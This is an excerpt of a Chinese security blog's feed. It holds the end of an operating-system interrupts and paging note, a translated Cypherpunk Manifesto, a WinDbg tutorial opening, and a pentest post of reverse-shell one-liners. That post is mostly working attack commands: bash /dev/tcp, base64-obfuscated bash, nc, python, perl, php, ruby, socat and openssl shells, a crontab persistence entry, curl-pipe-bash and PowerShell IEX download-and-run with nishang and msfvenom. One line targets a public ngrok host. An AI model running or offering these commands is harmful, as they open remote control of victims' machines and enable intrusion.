href="https://blog.joe1sn.top/2022/03/14/os-falut/">操作系统实现-异常</a>主要讲的就是这种中断</p><p>CPU时钟周期和前面实时时钟的不一样，CPU内部是有一个时钟周期作为指令操作的最小步骤的，当CPU运算快时，时钟周期就短（其倒数频率就越大），如<code>Intel(R) Core(TM) i5-9300H CPU</code>的基础时钟频率就是2.6GHz，每个时钟周期的时间就是<code>1/(2.6*1024*1024*1024)</code>秒。</p><h2 id="引用-2"><a class="markdownIt-Anchor" href="#引用-2"></a> 引用</h2><p>x86汇编语言：从实模式到保护模式 / 李忠，王晓波，余洁著</p><p><a href="https://github.com/junler/linux-source-code-analyze/blob/c60d57def7cbf1b6bd52b41d80a1c25fdfd0134d/interrupt_softward.md">中断处理 - 上半部（硬中断）</a></p><h1 id="操作系统实现-内存管理初步"><a class="markdownIt-Anchor" href="#操作系统实现-内存管理初步"></a> 操作系统实现-内存管理初步</h1><h2 id="复习"><a class="markdownIt-Anchor" href="#复习"></a> 复习</h2><p>计算机启动过程</p><img src="https://img.joe1sn.top/uploads/big/996a02fdab5785c7659475f1c8832b11.png" alt="img" style="zoom: 50%;" /><ul><li>386/486 内存分页中以 4KB 为一页</li><li>奔腾处理器使用4M为一页</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码来源：&lt;a href=&quot;https://github.com/StevenBaby/onix&quot;&gt;https://github.com/StevenBaby/onix&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;相关课程：&lt;a href=&quot;https://www.bilibili.com/video/BV1gR4y1u7or&quot;&gt;https://www.bilibili.com/video/BV1gR4y1u7or&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;感谢B站UP：&lt;a href=&quot;https://space.bilibili.com/491131440&quot;&gt;踌躇月光&lt;/a&gt; 带来的相关代码和教程&lt;/p&gt;
&lt;p&gt;后来觉得操作系统从0到1这样学是一个非常蠢得概念，因为每个人学习他应该是有重点地。对系统有个基础的认知后，就该去精通自己要专注的方向，比如内存管理、网络协议等&lt;br /&gt;
也有可能你只是为了面试，但是面试也是有重点的对吧&lt;br /&gt;
所以把之前的文章做一个合集，喜欢在认识系统后再在方面创造子系统&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="os" scheme="https://joe1sn.eu.org/categories/notes/os/"/>
    
    
    <category term="os" scheme="https://joe1sn.eu.org/tags/os/"/>
    
  </entry>
  
  <entry>
    <title>密码朋克：一份密码朋克宣言</title>
    <link href="https://joe1sn.eu.org/2022/08/14/cypherpunk/"/>
    <id>https://joe1sn.eu.org/2022/08/14/cypherpunk/</id>
    <published>2022-08-14T07:25:53.000Z</published>
    <updated>2023-06-01T14:26:03.768Z</updated>
    
    <content type="html"><![CDATA[<p>为何自由与隐私如此重要</p><span id="more"></span><blockquote><p>译文</p></blockquote><h1 id="一份密码朋克宣言"><a class="markdownIt-Anchor" href="#一份密码朋克宣言"></a> 一份密码朋克宣言</h1><p><a href="ftp://soda.berkeley.edu/pub/cypherpunks/people/hughes.html">Eric Hughes</a>著   <a href="www.joe1sn.top">Joe1sn</a>渣译</p><p>隐私在电子时代对于一个开放的社会是必要的。隐私不是保密。隐私是一个人不想让全世界知道，但是保密是一个人不想让全任何人知道。隐私是一个人对这个世界选择性表达自我的权力。</p><p>如果双方有某种交易，那么每一方都有他们互动的记忆。 每一方都可以谈论他们自己对此的记忆； 谁能阻止这发生？人们可以通过法律反对它，但是对于言论自由甚至比隐私更加重要，这是开放社会的基础。如果多方在同一个论坛上共同发言，则每一方都可以与其他所有方共同对话，并将个体的和其他只是汇总在一起。电子通信的力量已经使这种讲话称为可能，它不会仅仅因为我们可能想要它而消失。</p><p>既然我们渴望隐私，我们必须确保交易的每方只有直接与该交易相关的必要的信息。鉴于所有信息都能被表达出，我们必须确保尽可能少地透露无关信息。对于大多数例子中的个人标识(ID)的需要并不是十分突出。当我们在商店中购买一本杂志并付款给店员时，并没有必要知道我是谁。当我让我的电子邮箱提供方收发邮件时，我的提供方不需要知道谁与我对话或者我和其他人说了些什么。我的提供方只需要知道如何在那里获取信息以及我欠他们多少费用。当我的身份在交易的底层机制中被揭露了，我就失去了隐私。我不能在这里选择性地展示自己； 我必须 <em>经常</em> 暴露自己。</p><p>因此，为了开放社会中的隐私就需要一种匿名交易系统。直到现在，现金是第一个满足这个条件的系统。一个匿名的交易系统不是一个保密的交易系统。一个匿名的交易系统的个体具有想揭露自身身份就揭露的权力；这也是隐私的本质。</p><p>在开放社会中的隐私也需要密码学。如果我说了些什么，我只想让我想知道的人知道。如果我的私密讲话被全世界知道，我就失去了隐私。对信息的加密表明了对隐私的追求，使用弱加密算法加密表达的是对与隐私不是特别的追求。此外，为了在默认匿名的情况下显示一个人的身份，需要密码学签名。</p><p>我们不能指望政府，企业，其他巨头、不露面的组织出于他们的善意保证我们的隐私。谈论我们对他们是有利的，并且我们认为他们会谈论我们。去尝试保护他们的演讲就是反击信息的真实。信息不是想要自由，而是注定自由。信息扩大到每一个可用的存储空间。信息是谣言更年轻，更强壮的的表亲；信息比谣言更快，有更多的眼睛，知道的更多，了解的更少。</p><p>我们必须保护我们的隐私如果我们期望的话。我们必须在一起共同创造允许匿名交易发生的系统。人们在几个世纪内通过耳语，黑暗，信封，紧闭的门，秘密握手和邮递保护他们的隐私。旧时代的科技并不允许有很私密的隐私，但是电子科技可以。</p><p>我们密码朋克投入到建设匿名系统。我们使用密码学、匿名邮件、数字签名和电子货币来保卫我们的隐私。</p><p>密码朋克编写代码。我们知道有人必须编写软件来保护隐私，并且除非我们都这样做，否则我们无法获得隐私，因此我们将编写它。我们发布我们的代码所以其他的密码朋克可以练习和玩耍这些代码。我们的代码是全世界性的免费使用的。我们并不关心如果你不赞同我们编写的软件。我们知道软件是不可能被毁灭的并且一个大范围部署的系统是不能被关停的。</p><p>密码朋克对密码学的规定感到痛惜，因为加密本质上是一种私人行为。事实上，对于加密这种行为，让信息从公众领域中被移除。即使是反对密码学的法律也只能触及一个国家的边界和它的暴力武器。密码朋克会不可避免地在全球发展，伴随着的是匿名交易系统使这成为可能。</p><p>为了隐私权的广泛传播它必须成为社会共识的一部分。人们必须为了共同利益来部署这些系统。隐私只能延伸到社会同胞的合作范围内。我们密码朋克寻求您的问题和疑虑，并希望我们可以与您互动，以免我们自欺欺人。然而，我们不会因为有些人可能不同意我们的目标而离开我们的目标。</p><p>密码朋克积极致力于使网络更安全以保护隐私。 让我们一起快速前进。</p><p>向前。</p><p><a href="ftp://soda.berkeley.edu/pub/cypherpunks/people/hughes.html">Eric Hughes </a></p><p>1993年3月9日</p><hr /><blockquote><p>原文</p></blockquote><h1 id="a-cypherpunks-manifesto"><a class="markdownIt-Anchor" href="#a-cypherpunks-manifesto"></a> A Cypherpunk’s Manifesto</h1><p>by <a href="ftp://soda.berkeley.edu/pub/cypherpunks/people/hughes.html">Eric Hughes</a></p><p>Privacy is necessary for an open society in the electronic age. Privacy is not secrecy. A private matter is something one doesn’t want the whole world to know, but a secret matter is something one doesn’t want anybody to know. Privacy is the power to selectively reveal oneself to the world.</p><p>If two parties have some sort of dealings, then each has a memory of their interaction. Each party can speak about their own memory of this; how could anyone prevent it? One could pass laws against it, but the freedom of speech, even more than privacy, is fundamental to an open society; we seek not to restrict any speech at all. If many parties speak together in the same forum, each can speak to all the others and aggregate together knowledge about individuals and other parties. The power of electronic communications has enabled such group speech, and it will not go away merely because we might want it to.</p><p>Since we desire privacy, we must ensure that each party to a transaction have knowledge only of that which is directly necessary for that transaction. Since any information can be spoken of, we must ensure that we reveal as little as possible. In most cases personal identity is not salient. When I purchase a magazine at a store and hand cash to the clerk, there is no need to know who I am. When I ask my electronic mail provider to send and receive messages, my provider need not know to whom I am speaking or what I am saying or what others are saying to me; my provider only need know how to get the message there and how much I owe them in fees. When my identity is revealed by the underlying mechanism of the transaction, I have no privacy. I cannot here selectively reveal myself; I must <em>always</em> reveal myself.</p><p>Therefore, privacy in an open society requires anonymous transaction systems. Until now, cash has been the primary such system. An anonymous transaction system is not a secret transaction system. An anonymous system empowers individuals to reveal their identity when desired and only when desired; this is the essence of privacy.</p><p>Privacy in an open society also requires cryptography. If I say something, I want it heard only by those for whom I intend it. If the content of my speech is available to the world, I have no privacy. To encrypt is to indicate the desire for privacy, and to encrypt with weak cryptography is to indicate not too much desire for privacy. Furthermore, to reveal one’s identity with assurance when the default is anonymity requires the cryptographic signature.</p><p>We cannot expect governments, corporations, or other large, faceless organizations to grant us privacy out of their beneficence. It is to their advantage to speak of us, and we should expect that they will speak. To try to prevent their speech is to fight against the realities of information. Information does not just want to be free, it longs to be free. Information expands to fill the available storage space. Information is Rumor’s younger, stronger cousin; Information is fleeter of foot, has more eyes, knows more, and understands less than Rumor.</p><p>We must defend our own privacy if we expect to have any. We must come together and create systems which allow anonymous transactions to take place. People have been defending their own privacy for centuries with whispers, darkness, envelopes, closed doors, secret handshakes, and couriers. The technologies of the past did not allow for strong privacy, but electronic technologies do.</p><p>We the Cypherpunks are dedicated to building anonymous systems. We are defending our privacy with cryptography, with anonymous mail forwarding systems, with digital signatures, and with electronic money.</p><p>Cypherpunks write code. We know that someone has to write software to defend privacy, and since we can’t get privacy unless we all do, we’re going to write it. We publish our code so that our fellow Cypherpunks may practice and play with it. Our code is free for all to use, worldwide. We don’t much care if you don’t approve of the software we write. We know that software can’t be destroyed and that a widely dispersed system can’t be shut down.</p><p>Cypherpunks deplore regulations on cryptography, for encryption is fundamentally a private act. The act of encryption, in fact, removes information from the public realm. Even laws against cryptography reach only so far as a nation’s border and the arm of its violence. Cryptography will ineluctably spread over the whole globe, and with it the anonymous transactions systems that it makes possible.</p><p>For privacy to be widespread it must be part of a social contract. People must come and together deploy these systems for the common good. Privacy only extends so far as the cooperation of one’s fellows in society. We the Cypherpunks seek your questions and your concerns and hope we may engage you so that we do not deceive ourselves. We will not, however, be moved out of our course because some may disagree with our goals.</p><p>The Cypherpunks are actively engaged in making the networks safer for privacy. Let us proceed together apace.</p><p>Onward.</p><p>Eric Hughes <a href="ftp://soda.berkeley.edu/pub/cypherpunks/people/hughes.html"></a></p><p>9 March 1993</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;为何自由与隐私如此重要&lt;/p&gt;</summary>
    
    
    
    <category term="misc" scheme="https://joe1sn.eu.org/categories/misc/"/>
    
    
    <category term="misc" scheme="https://joe1sn.eu.org/tags/misc/"/>
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>常规反弹shell合集</title>
    <link href="https://joe1sn.eu.org/2022/07/29/reverse-shell/"/>
    <id>https://joe1sn.eu.org/2022/07/29/reverse-shell/</id>
    <published>2022-07-29T11:18:41.000Z</published>
    <updated>2023-06-01T14:26:19.370Z</updated>
    
    <content type="html"><![CDATA[<p>反弹shell的常见方式</p><span id="more"></span><h1 id="反弹shell-linux"><a class="markdownIt-Anchor" href="#反弹shell-linux"></a> 反弹Shell-Linux</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">【监听端】centos: 192.168.35.152</span><br><span class="line">【被控端】kali: 192.168.35.128</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 监听端执行</span></span><br><span class="line">[root@localhost ~]<span class="comment"># nc -vvl 7777</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::7777</span><br><span class="line">Ncat: Listening on 0.0.0.0:7777</span><br></pre></td></tr></table></figure><h2 id="bash"><a class="markdownIt-Anchor" href="#bash"></a> bash</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1     # 执行失败                                   </span></span><br><span class="line">zsh: 没有那个文件或目录: /dev/tcp/<span class="number">192.168</span><span class="number">.35</span><span class="number">.152</span>/<span class="number">7777</span> </span><br></pre></td></tr></table></figure><p><a href="http://0.tcp.ngrok.io:15122">0.tcp.ngrok.io:15122</a></p><p>bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15122 0&gt;&amp;1</p><h2 id="bash-base64"><a class="markdownIt-Anchor" href="#bash-base64"></a> bash base64</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1</span></span><br><span class="line">bash -c <span class="string">&#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="bash-base64-urlencode"><a class="markdownIt-Anchor" href="#bash-base64-urlencode"></a> bash base64 URLencode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1</span></span><br><span class="line">bash -c <span class="string">&#x27;&#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA%3D%3D&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="nc"><a class="markdownIt-Anchor" href="#nc"></a> nc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.35.152 7777</span><br><span class="line"><span class="built_in">mknod</span> backpipe p &amp;&amp; nc 192.168.35.152 7777 0&lt;backpipe | /bin/bash 1&gt;backpipe </span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.35.152 7777 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h2 id="ncat"><a class="markdownIt-Anchor" href="#ncat"></a> ncat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat  192.168.35.152 7777 -e /bin/bash</span><br><span class="line">ncat --udp 192.168.35.152 7777 -e /bin/bash</span><br></pre></td></tr></table></figure><h2 id="curl"><a class="markdownIt-Anchor" href="#curl"></a> curl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali开启http服务，把bash命令写入html文件</span></span><br><span class="line"><span class="built_in">cat</span> bash.html</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># centos</span></span><br><span class="line">curl 192.168.35.152/bash.html|bash</span><br></pre></td></tr></table></figure><h2 id="http"><a class="markdownIt-Anchor" href="#http"></a> http</h2><p>攻击方：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编写shell脚本并启动http服务器</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777 0&gt;&amp;1&quot;</span> &gt; shell.sh</span><br><span class="line">python2环境下：python -m SimpleHTTPServer 80</span><br><span class="line">python3环境下：python -m http.server 80</span><br></pre></td></tr></table></figure><p>被控端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传shell.sh文件</span></span><br><span class="line">wget 192.168.35.152/shell.sh</span><br><span class="line"><span class="comment"># 执行shell.sh文件</span></span><br><span class="line">bash shell.sh</span><br></pre></td></tr></table></figure><h2 id="crontab"><a class="markdownIt-Anchor" href="#crontab"></a> crontab</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.35.152/7777  0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="whois"><a class="markdownIt-Anchor" href="#whois"></a> whois</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只能执行指定命令，如pwd命令</span></span><br><span class="line">whois -h 192.168.35.152 -p 7777 `<span class="built_in">pwd</span>` </span><br></pre></td></tr></table></figure><h2 id="python"><a class="markdownIt-Anchor" href="#python"></a> python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.35.152&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="php"><a class="markdownIt-Anchor" href="#php"></a> php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ruby"><a class="markdownIt-Anchor" href="#ruby"></a> ruby</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.35.152&quot;,7777).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span>  <span class="comment"># 执行失败</span></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.35.152&quot;,&quot;7777&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="socat"><a class="markdownIt-Anchor" href="#socat"></a> socat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.35.152:7777</span><br></pre></td></tr></table></figure><h2 id="perl"><a class="markdownIt-Anchor" href="#perl"></a> perl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.35.152&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="php-2"><a class="markdownIt-Anchor" href="#php-2"></a> php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.35.152&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="openssl"><a class="markdownIt-Anchor" href="#openssl"></a> openssl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听端</span></span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 7777</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">ncat --ssl -vv -l -p 7777</span><br><span class="line"></span><br><span class="line"><span class="comment"># 受控端</span></span><br><span class="line"><span class="built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.35.152:7777 &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure><h1 id="反弹shell-windows"><a class="markdownIt-Anchor" href="#反弹shell-windows"></a> 反弹Shell-Windows</h1><ul><li>Windows下的反弹shell仅测试了nc，执行成功。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">【监听端】centos: 192.168.35.152</span><br><span class="line">【被控端】windows: 192.168.35.1</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 监听端执行</span></span><br><span class="line">[root@localhost ~]<span class="comment"># nc -vvl 7777</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::7777</span><br><span class="line">Ncat: Listening on 0.0.0.0:7777</span><br></pre></td></tr></table></figure><h2 id="powercat"><a class="markdownIt-Anchor" href="#powercat"></a> powercat</h2><p>项目地址：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.Net.Webclient.DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>);powercat -c 192.168.35.152 -p 7777 -e cmd</span><br></pre></td></tr></table></figure><h2 id="nc-2"><a class="markdownIt-Anchor" href="#nc-2"></a> nc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.35.152 7777 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure><h2 id="nishang"><a class="markdownIt-Anchor" href="#nishang"></a> nishang</h2><p>Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p><p>项目地址：<a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将nishang下载到攻击者本地，在目标机使用powershell执行以下命令</span></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.35.152 -port 7777</span><br></pre></td></tr></table></figure><h2 id="reverse-udp-shell"><a class="markdownIt-Anchor" href="#reverse-udp-shell"></a> Reverse UDP shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.35.152/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">Invoke-PowerShellUdp -Reverse -IPAddress 192.168.35.152 -port 7777</span><br></pre></td></tr></table></figure><h2 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找出各类反弹一句话payload的路径信息</span></span><br><span class="line">msfvenom -l payloads | grep <span class="string">&#x27;cmd/windows/reverse&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成反弹shell，复制粘贴到靶机上运行</span></span><br><span class="line">msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.35.152 LPORT=7777</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;反弹shell的常见方式&lt;/p&gt;</summary>
    
    
    
    <category term="pentest" scheme="https://joe1sn.eu.org/categories/pentest/"/>
    
    
    <category term="渗透" scheme="https://joe1sn.eu.org/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>windbg调试入门笔记</title>
    <link href="https://joe1sn.eu.org/2022/06/10/windbg-note/"/>
    <id>https://joe1sn.eu.org/2022/06/10/windbg-note/</id>
    <published>2022-06-10T03:52:56.000Z</published>
    <updated>2023-06-01T14:26:48.239Z</updated>
    
    <content type="html"><![CDATA[<p>准备点windows基础功</p><span id="more"></span><h1 id="安装与配置"><a class="markdownIt-Anchor" href="#安装与配置"></a> 安装与配置</h1><h2 id="1版本"><a class="markdownIt-Anchor" href="#1版本"></a> 1.版本</h2><p>WinDbg一般分为x86和x64，具体由调试os平台(Host)和被调试程序类型决定</p><ul><li><p>x86-based Host Computer</p><p>x86处理器平台上调试所有程序都使用该版本</p></li><li><p>x64-based Host Computer</p><ol><li><p>分析DUMP文件：若文件是在windows XP及更新的版本生成的，则两者都可；若Windows2000及更早的版本就只能使用x86版本的WinDbg</p></li><li><p>双机调试</p><p>对于WindowsXP及其更新的系统windbg会自动适应，更老的只能使用x86版本</p></li><li><p>用户态</p><p>x64版本程序只能使用x64版本，x86版本程序则是两者皆可</p></li></ol></li></ul><h2 id="2工作空间"><a class="markdownIt-Anchor" href="#2工作空间"></a> 2.工作空间</h2><p>​每调试一个程序，会涉及到要使用的参数、配置等信息，WinDBG会使用<code>Workspace</code>来保存这些信息，可以理解为项目文件<br />​<img src="https://img.joe1sn.top/uploads/big/31aa964c371ef13a22717dae6c0dae5f.png" alt="image-20220609192902393" /></p><h2 id="3调试符号"><a class="markdownIt-Anchor" href="#3调试符号"></a> 3.调试符号</h2><p>​最经典的就是使用IDA反汇编的时候，如果文件没有调试符号信息，那么函数就会被命名为<code>sub_startaddr</code>这样。所以在调试的时候这些信息会大大帮助我们理解程序</p><p>​windows的就是PDB文件，</p><p><img src="https://img.joe1sn.top/uploads/big/db341f48da00aa2a5ee50f661c31ef9f.png" alt="image-20220609193314803" /></p><p><img src="https://img.joe1sn.top/uploads/big/a00f0495058fee33942e17baf4649f33.png" alt="image-20220609193424085" /></p><p>WinDBG允许用户指定一个或者多个目录存放符号文件，并使用环境变量<code>_NT_SYMBOL_PATH</code>指向目录，最常用的是从微软的符号服务器下载(IDA会默认加载，并且设置了全局变量为符号服务器的话每次vs编译都会从服务器拉，特别慢)，具体配置百度</p><p><strong>相关指令</strong></p><p><code>ld</code>：自动从符号文件目录或者符号服务器加载符号文件</p><ol><li><p>使用 <code>lm</code> 查看模块</p><p><img src="https://img.joe1sn.top/uploads/big/913b12c4e2e3e79ef892bc40f6cf261f.png" alt="image-20220609194324229" /></p></li><li><p>符号的表达：<code>模块名!函数名</code>，</p><p>如<code>kernel32</code>模块的<code>OpenProcess</code>函数：<code>kernel32!OpenProcess</code></p><p>内核不同，比如 <code>ntdll!NtOpenProcess</code> 和 <code>nt!NtOpenProcess</code> 分别表示ntdll中的NtOpenProcess函数 和 内核模块中的NtOpenProcess函数</p></li><li><p>符号检索：<code>x [选项] Module!Symbol</code></p><p>符号名可以使用<code>? * [] # +</code>进行模糊匹配</p></li><li><p>源码级别调试</p><p>需要源文件于WinDBG在同一系统中，使用<code>ctrl+P</code>，指定源代码路径就行了，多个路径使用<code>;</code>分隔</p><p>使用<code>ctrl+O</code>选择源代码文件，在源代码文件中<code>F9</code>添加断点</p><p><img src="https://img.joe1sn.top/uploads/big/c5f4ad5e8db7eba2674b8f309f065c0e.png" alt="image-20220609195717749" /></p><p><img src="https://img.joe1sn.top/uploads/big/c32ffb9d7d3c7d1858cc570953b2b6d4.png" alt="image-20220609200249003" /></p></li></ol><h1 id="调试过程"><a class="markdownIt-Anchor" href="#调试过程"></a> 调试过程</h1><h2 id="1开始调试"><a class="markdownIt-Anchor" href="#1开始调试"></a> 1.开始调试</h2><p>反汇编代码默认停留在<code>ntdll</code>中的系统断点，使用<code>g @$exentry</code>跳转带函数入口</p><p><img src="https://img.joe1sn.top/uploads/big/258375d98f20ace03cc23a36c47152ab.png" alt="image-20220609201112856" /></p><h2 id="2控制目标程序执行"><a class="markdownIt-Anchor" href="#2控制目标程序执行"></a> 2.控制目标程序执行</h2><p><img 